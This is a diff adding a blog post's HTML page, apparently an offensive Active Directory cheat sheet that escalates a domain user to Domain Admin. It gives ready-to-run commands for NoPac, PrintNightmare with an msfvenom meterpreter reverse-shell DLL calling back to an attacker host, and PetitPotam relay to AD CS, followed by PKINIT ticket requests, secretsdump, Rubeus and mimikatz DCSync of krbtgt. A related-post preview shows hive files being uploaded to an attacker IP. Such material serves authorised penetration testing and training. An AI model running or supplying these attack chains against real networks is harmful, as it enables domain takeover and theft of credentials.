@@ -1,0 +1,302 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Bleeding-Edge &amp; Coercion | Twistzz</title><meta name="author" content="Twistzz"><meta name="copyright" content="Twistzz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin.  NoPac (CVE-2021-42278 &#x2F; 42287) ➜ NoPac chains two bugs: we rename a machine account we create to match">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bleeding-Edge &amp; Coercion">
+<meta property="og:url" content="https://twistzz-ctf.github.io/2026/06/30/Bleeding-Edge-Coercion/index.html">
+<meta property="og:site_name" content="Twistzz">
+<meta property="og:description" content="➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin.  NoPac (CVE-2021-42278 &#x2F; 42287) ➜ NoPac chains two bugs: we rename a machine account we create to match">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://twistzz-ctf.github.io/images/avatar.png">
+<meta property="article:published_time" content="2026-06-30T19:53:03.000Z">
+<meta property="article:modified_time" content="2026-08-18T23:24:50.598Z">
+<meta property="article:author" content="Twistzz">
+<meta property="article:tag" content="ADCS">
+<meta property="article:tag" content="Active-Directory">
+<meta property="article:tag" content="CVE-2021-1675">
+<meta property="article:tag" content="CVE-2021-34527">
+<meta property="article:tag" content="CVE-2021-36942">
+<meta property="article:tag" content="CVE-2021-42278">
+<meta property="article:tag" content="CVE-2021-42287">
+<meta property="article:tag" content="Certificate-Abuse">
+<meta property="article:tag" content="DCSync">
+<meta property="article:tag" content="Domain-Escalation">
+<meta property="article:tag" content="Impacket">
+<meta property="article:tag" content="Mimikatz">
+<meta property="article:tag" content="NTLM-Relay">
+<meta property="article:tag" content="NetExec">
+<meta property="article:tag" content="NoPac">
+<meta property="article:tag" content="PKINIT">
+<meta property="article:tag" content="PKINITtools">
+<meta property="article:tag" content="PetitPotam">
+<meta property="article:tag" content="Print-Spooler">
+<meta property="article:tag" content="PrintNightmare">
+<meta property="article:tag" content="Privilege-Escalation">
+<meta property="article:tag" content="Rubeus">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="ntlmrelayx">
+<meta property="article:tag" content="secretsdump">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twistzz-ctf.github.io/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Bleeding-Edge & Coercion",
+  "url": "https://twistzz-ctf.github.io/2026/06/30/Bleeding-Edge-Coercion/",
+  "image": "https://twistzz-ctf.github.io/images/avatar.png",
+  "datePublished": "2026-06-30T19:53:03.000Z",
+  "dateModified": "2026-08-18T23:24:50.598Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Twistzz",
+      "url": "https://twistzz-ctf.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.ico"><link rel="canonical" href="https://twistzz-ctf.github.io/2026/06/30/Bleeding-Edge-Coercion/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Bleeding-Edge & Coercion',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/avatar.png" alt="Logo"><span class="site-name">Twistzz</span></a><a class="nav-page-title" href="/"><span class="site-name">Bleeding-Edge &amp; Coercion</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div></div></nav><div id="post-info"><h1 class="post-title">Bleeding-Edge &amp; Coercion</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-06-30T19:53:03.000Z" title="Created 2026-06-30 20:53:03">2026-06-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-08-18T23:24:50.598Z" title="Updated 2026-08-19 00:24:50">2026-08-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/">Active Directory</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Exploitation/">Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Exploitation/Bleeding-Edge-Coercion/">Bleeding-Edge &amp; Coercion</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p>➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin.</p>
+</blockquote>
+<h2 id="NoPac-CVE-2021-42278-42287"><a href="#NoPac-CVE-2021-42278-42287" class="headerlink" title="NoPac (CVE-2021-42278 &#x2F; 42287)"></a>NoPac (CVE-2021-42278 &#x2F; 42287)</h2><blockquote>
+<p>➜ NoPac chains two bugs: we rename a machine account we create to match the DC’s name (42278), then request a service ticket after the DC object is restored, so the KDC issues us a ticket as the DC (42287). The result is a SYSTEM shell or a DCSync.</p>
+</blockquote>
+<h4 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h4><h5 id="Clone-NoPac"><a href="#Clone-NoPac" class="headerlink" title="Clone NoPac"></a>Clone NoPac</h5><blockquote>
+<p>➜ Clone the exploit repo :</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Ridter/noPac.git</span><br></pre></td></tr></table></figure>
+
+<h4 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Scan-Whether-the-Domain-Is-Vulnerable"><a href="#Scan-Whether-the-Domain-Is-Vulnerable" class="headerlink" title="Scan Whether the Domain Is Vulnerable"></a>Scan Whether the Domain Is Vulnerable</h5><blockquote>
+<p>➜ Run the bundled scanner to confirm the DC is exploitable before firing.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 scanner.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -use-ldap</span><br></pre></td></tr></table></figure>
+
+<h5 id="Pop-a-SYSTEM-Shell-on-the-DC"><a href="#Pop-a-SYSTEM-Shell-on-the-DC" class="headerlink" title="Pop a SYSTEM Shell on the DC"></a>Pop a SYSTEM Shell on the DC</h5><blockquote>
+<p>➜ Impersonate the administrator and drop into a semi-interactive SYSTEM shell.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 noPac.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -dc-host &lt;DC_HOST&gt; --impersonate administrator -use-ldap -shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="DCSync-Straight-to-a-Dump"><a href="#DCSync-Straight-to-a-Dump" class="headerlink" title="DCSync Straight to a Dump"></a>DCSync Straight to a Dump</h5><blockquote>
+<p>➜ Skip the shell and dump the administrator’s hash directly via DCSync.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 noPac.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -dc-host &lt;DC_HOST&gt; --impersonate administrator -use-ldap -dump -just-dc-user &lt;DOMAIN&gt;/administrator</span><br></pre></td></tr></table></figure>
+
+<h2 id="PrintNightmare-CVE-2021-1675-34527"><a href="#PrintNightmare-CVE-2021-1675-34527" class="headerlink" title="PrintNightmare (CVE-2021-1675 &#x2F; 34527)"></a>PrintNightmare (CVE-2021-1675 &#x2F; 34527)</h2><blockquote>
+<p>➜ PrintNightmare abuses the Print Spooler service: a low-priv user makes the spooler load a malicious driver DLL, which runs as SYSTEM on the target.</p>
+</blockquote>
+<h4 id="Setup-1"><a href="#Setup-1" class="headerlink" title="Setup"></a>Setup</h4><h5 id="Clone-the-Exploit"><a href="#Clone-the-Exploit" class="headerlink" title="Clone the Exploit"></a>Clone the Exploit</h5><blockquote>
+<p>➜ Clone the exploit repo :</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cube0x0/CVE-2021-1675.git</span><br></pre></td></tr></table></figure>
+
+<h5 id="Remove-the-Default-Impacket"><a href="#Remove-the-Default-Impacket" class="headerlink" title="Remove the Default Impacket"></a>Remove the Default Impacket</h5><blockquote>
+<p>➜ This exploit requires cube0x0’s Impacket fork, so uninstall the current one first.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 uninstall impacket</span><br></pre></td></tr></table></figure>
+
+<h5 id="Clone-cube0x0’s-Impacket"><a href="#Clone-cube0x0’s-Impacket" class="headerlink" title="Clone cube0x0’s Impacket"></a>Clone cube0x0’s Impacket</h5><blockquote>
+<p>➜ Clone the required fork.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cube0x0/impacket</span><br></pre></td></tr></table></figure>
+
+<h5 id="Install-cube0x0’s-Impacket"><a href="#Install-cube0x0’s-Impacket" class="headerlink" title="Install cube0x0’s Impacket"></a>Install cube0x0’s Impacket</h5><blockquote>
+<p>➜ Install the fork so the exploit’s RPC calls work.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> impacket &amp;&amp; <span class="built_in">sudo</span> python3 ./setup.py install</span><br></pre></td></tr></table></figure>
+
+<h4 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Confirm-the-Spooler-RPC-Interface-Is-Reachable"><a href="#Confirm-the-Spooler-RPC-Interface-Is-Reachable" class="headerlink" title="Confirm the Spooler RPC Interface Is Reachable"></a>Confirm the Spooler RPC Interface Is Reachable</h5><blockquote>
+<p>➜ Check the target exposes MS-RPRN &#x2F; MS-PAR.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcdump.py @&lt;DC_IP&gt; | egrep <span class="string">&#x27;MS-RPRN|MS-PAR&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Generate-the-Payload-DLL"><a href="#Generate-the-Payload-DLL" class="headerlink" title="Generate the Payload DLL"></a>Generate the Payload DLL</h5><blockquote>
+<p>➜ Build a reverse-shell driver DLL.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=8080 -f dll -o backupscript.dll</span><br></pre></td></tr></table></figure>
+
+<h5 id="Host-the-DLL-on-an-SMB-Share"><a href="#Host-the-DLL-on-an-SMB-Share" class="headerlink" title="Host the DLL on an SMB Share"></a>Host the DLL on an SMB Share</h5><blockquote>
+<p>➜ Serve the DLL so the spooler can fetch it.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> smbserver.py -smb2support CompData /path/to/dll/</span><br></pre></td></tr></table></figure>
+
+<h5 id="Fire-the-Exploit"><a href="#Fire-the-Exploit" class="headerlink" title="Fire the Exploit"></a>Fire the Exploit</h5><blockquote>
+<p>➜ Force the spooler to load the DLL from our share, executing it as SYSTEM.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 CVE-2021-1675.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;DC_IP&gt; <span class="string">&#x27;\\&lt;attacker&gt;\CompData\backupscript.dll&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="PetitPotam-→-ADCS-Relay-CVE-2021-36942"><a href="#PetitPotam-→-ADCS-Relay-CVE-2021-36942" class="headerlink" title="PetitPotam → ADCS Relay (CVE-2021-36942)"></a>PetitPotam → ADCS Relay (CVE-2021-36942)</h2><blockquote>
+<p>➜ Coercion means forcing a machine to authenticate to us, PetitPotam coerces the DC to authenticate and we relay that authentication to the AD CS web-enrollment endpoint to request a certificate as the DC which we then use to DCSync.</p>
+</blockquote>
+<h4 id="Linux-Path"><a href="#Linux-Path" class="headerlink" title="Linux Path"></a>Linux Path</h4><h5 id="Relay-the-DC-Auth-to-the-CA"><a href="#Relay-the-DC-Auth-to-the-CA" class="headerlink" title="Relay the DC Auth to the CA"></a>Relay the DC Auth to the CA</h5><blockquote>
+<p>➜ Stand up the relay against the CA’s web-enrollment endpoint and request a DomainController certificate.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -debug -smb2support --target http://&lt;CA_HOST&gt;/certsrv/certfnsh.asp --adcs --template DomainController</span><br></pre></td></tr></table></figure>
+
+<h5 id="Coerce-the-DC-to-Authenticate"><a href="#Coerce-the-DC-to-Authenticate" class="headerlink" title="Coerce the DC to Authenticate"></a>Coerce the DC to Authenticate</h5><blockquote>
+<p>➜ Force the DC to authenticate to our relay.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py &lt;attacker_IP&gt; &lt;DC_IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Request-a-TGT-via-PKINIT"><a href="#Request-a-TGT-via-PKINIT" class="headerlink" title="Request a TGT via PKINIT"></a>Request a TGT via PKINIT</h5><blockquote>
+<p>➜ Use the captured base64 certificate to request a TGT for the DC account.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /opt/PKINITtools/gettgtpkinit.py &lt;DOMAIN&gt;/&lt;DC_NAME&gt;\$ -pfx-base64 &lt;BASE64_CERT&gt; dc01.ccache</span><br></pre></td></tr></table></figure>
+
+<h5 id="Export-the-Ticket"><a href="#Export-the-Ticket" class="headerlink" title="Export the Ticket"></a>Export the Ticket</h5><blockquote>
+<p>➜ Point Kerberos at the new ticket cache.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=dc01.ccache</span><br></pre></td></tr></table></figure>
+
+<h5 id="DCSync-the-Domain"><a href="#DCSync-the-Domain" class="headerlink" title="DCSync the Domain"></a>DCSync the Domain</h5><blockquote>
+<p>➜ DCSync the administrator using the DC’s ticket.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -just-dc-user &lt;DOMAIN&gt;/administrator -k -no-pass <span class="string">&quot;&lt;DC_FQDN&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Alternative-—-Recover-the-DC’s-NT-Hash"><a href="#Alternative-—-Recover-the-DC’s-NT-Hash" class="headerlink" title="Alternative — Recover the DC’s NT Hash"></a>Alternative — Recover the DC’s NT Hash</h4><h5 id="Extract-the-NT-Hash"><a href="#Extract-the-NT-Hash" class="headerlink" title="Extract the NT Hash"></a>Extract the NT Hash</h5><blockquote>
+<p>➜ Submit a TGS request for ourselves to recover the DC machine account’s NT hash from the TGT.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /opt/PKINITtools/getnthash.py -key &lt;AS-REP_KEY&gt; &lt;DOMAIN&gt;/&lt;DC_NAME&gt;\$</span><br></pre></td></tr></table></figure>
+
+<h5 id="Validate-via-Pass-the-Hash"><a href="#Validate-via-Pass-the-Hash" class="headerlink" title="Validate via Pass-the-Hash"></a>Validate via Pass-the-Hash</h5><blockquote>
+<p>➜ Tool: <strong>NetExec</strong> (<code>nxc</code>). Confirm the recovered DC hash works against the DC.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb &lt;DC_IP&gt; -u &lt;DC_NAME&gt;$ -H &lt;NT_HASH&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-Path"><a href="#Windows-Path" class="headerlink" title="Windows Path"></a>Windows Path</h4><h5 id="Request-a-TGT-with-Rubeus"><a href="#Request-a-TGT-with-Rubeus" class="headerlink" title="Request a TGT with Rubeus"></a>Request a TGT with Rubeus</h5><blockquote>
+<p>➜ Request and inject a TGT using the certificate.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:&lt;DC_NAME&gt;<span class="variable">$</span> /certificate:&lt;base64&gt; /ptt</span><br></pre></td></tr></table></figure>
+
+<h5 id="DCSync-with-Mimikatz"><a href="#DCSync-with-Mimikatz" class="headerlink" title="DCSync with Mimikatz"></a>DCSync with Mimikatz</h5><blockquote>
+<p>➜ DCSync the krbtgt account once the ticket is injected.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;lsadump::dcsync /user:&lt;DOMAIN&gt;\krbtgt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io">Twistzz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io/2026/06/30/Bleeding-Edge-Coercion/">https://twistzz-ctf.github.io/2026/06/30/Bleeding-Edge-Coercion/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/secretsdump/">secretsdump</a><a class="post-meta__tags" href="/tags/Privilege-Escalation/">Privilege-Escalation</a><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/Mimikatz/">Mimikatz</a><a class="post-meta__tags" href="/tags/Rubeus/">Rubeus</a><a class="post-meta__tags" href="/tags/Active-Directory/">Active-Directory</a><a class="post-meta__tags" href="/tags/Domain-Escalation/">Domain-Escalation</a><a class="post-meta__tags" href="/tags/NoPac/">NoPac</a><a class="post-meta__tags" href="/tags/CVE-2021-42278/">CVE-2021-42278</a><a class="post-meta__tags" href="/tags/CVE-2021-42287/">CVE-2021-42287</a><a class="post-meta__tags" href="/tags/PrintNightmare/">PrintNightmare</a><a class="post-meta__tags" href="/tags/CVE-2021-1675/">CVE-2021-1675</a><a class="post-meta__tags" href="/tags/CVE-2021-34527/">CVE-2021-34527</a><a class="post-meta__tags" href="/tags/PetitPotam/">PetitPotam</a><a class="post-meta__tags" href="/tags/CVE-2021-36942/">CVE-2021-36942</a><a class="post-meta__tags" href="/tags/ADCS/">ADCS</a><a class="post-meta__tags" href="/tags/NTLM-Relay/">NTLM-Relay</a><a class="post-meta__tags" href="/tags/PKINIT/">PKINIT</a><a class="post-meta__tags" href="/tags/ntlmrelayx/">ntlmrelayx</a><a class="post-meta__tags" href="/tags/PKINITtools/">PKINITtools</a><a class="post-meta__tags" href="/tags/DCSync/">DCSync</a><a class="post-meta__tags" href="/tags/NetExec/">NetExec</a><a class="post-meta__tags" href="/tags/Impacket/">Impacket</a><a class="post-meta__tags" href="/tags/Print-Spooler/">Print-Spooler</a><a class="post-meta__tags" href="/tags/Certificate-Abuse/">Certificate-Abuse</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/07/04/External-Reconnaissance/" title="External Reconnaissance"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">External Reconnaissance</div></div><div class="info-2"><div class="info-item-1"> ➜ Passive footprinting from outside the network ASN&#x2F;IP space, domains, DNS, public files, emails, usernames, and breach data.  ASN &amp; IP Space ➜ Web GUI bgp.he.net we enter the target domain to get its ASN, netblocks, IP, mail server, and nameservers.  WHOIS &amp; Registrar Data ➜ Pull registrar, organisation, and contact data for the domain.  1whois &lt;target-domain&gt;  DNS Records ➜ Resolve the host (A) record.  1nslookup &lt;target-domain&gt;   ➜ Enumerate the mail servers (MX)....</div></div></div></a><a class="pagination-related" href="/2026/06/30/Credential-Pillaging/" title="Credential Pillaging"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Credential Pillaging</div></div><div class="info-2"><div class="info-item-1"> ➜ With valid domain credentials in hand, the next goal is to harvest more credentials : Group Policy Preferences, SYSVOL logon scripts, and Active Directory attributes are the classic places administrators leave passwords behind.  Group Policy Preferences (GPP) ➜ Older versions of Group Policy Preferences stored passwords in the cPassword attribute. Although encrypted, Microsoft publicly released the AES key, so any discovered cPassword value can be decrypted.  LinuxSearch for GPP Passwords ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/06/26/Windows-Privilege-Escalation-CVEs/" title="Windows Privilege Escalation CVEs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-26</div><div class="info-item-2">Windows Privilege Escalation CVEs</div></div><div class="info-2"><div class="info-item-1">CVE-2021-36934 HiveNightmare &#x2F; SeriousSam HiveNightmare allows low-privileged users to read the SAM, SYSTEM, and SECURITY registry hives from Volume Shadow Copies.   Check if the machine is vulnerable.  1icacls C:\Windows\System32\config\SAM   Dump the registry hives using HiveNightmare.  1.\HiveNightmare.exe   Transfer the dumped hives to our machine.  1➜ uploadserver  12345curl.exe -F &quot;files=@SAM&quot; http://&lt;attacker-ip&gt;:8000/uploadcurl.exe -F &quot;files=@SYSTEM&quot; htt...</div></div></div></a><a class="pagination-related" href="/2026/06/30/Credential-Pillaging/" title="Credential Pillaging"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-30</div><div class="info-item-2">Credential Pillaging</div></div><div class="info-2"><div class="info-item-1"> ➜ With valid domain credentials in hand, the next goal is to harvest more credentials : Group Policy Preferences, SYSVOL logon scripts, and Active Directory attributes are the classic places administrators leave passwords behind.  Group Policy Preferences (GPP) ➜ Older versions of Group Policy Preferences stored passwords in the cPassword attribute. Although encrypted, Microsoft publicly released the AES key, so any discovered cPassword value can be decrypted.  LinuxSearch for GPP Passwords ...</div></div></div></a><a class="pagination-related" href="/2026/06/29/Credentialed-Enumeration/" title="Credentialed Enumeration"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-29</div><div class="info-item-2">Credentialed Enumeration</div></div><div class="info-2"><div class="info-item-1"> ➜ Once valid domain credentials have been obtained, the next step is to enumerate the Active Directory environment, the objective 